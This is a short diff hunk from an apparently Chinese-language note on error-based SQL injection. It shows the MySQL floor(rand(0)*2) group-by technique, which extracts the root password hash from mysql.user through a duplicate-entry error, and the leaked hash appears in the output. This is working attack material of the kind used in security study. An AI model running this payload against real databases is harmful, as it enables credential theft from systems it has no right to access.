@@ -1,4 +1,3 @@
-报错注入
 1.利用floor报错（MySQL任意版本）
 mysql> select user from user where user='root' and (select 1 from (select count(*),concat((select password from mysql.user where user='root' limit 1),0x20,floor(rand(0)*2))x from information_schema.tables group by x)a);
 ERROR 1062 (23000): Duplicate entry '*8D317C972E41BFE5109F28A34B644AFF3E3F99A5 1' for key 'group_key'
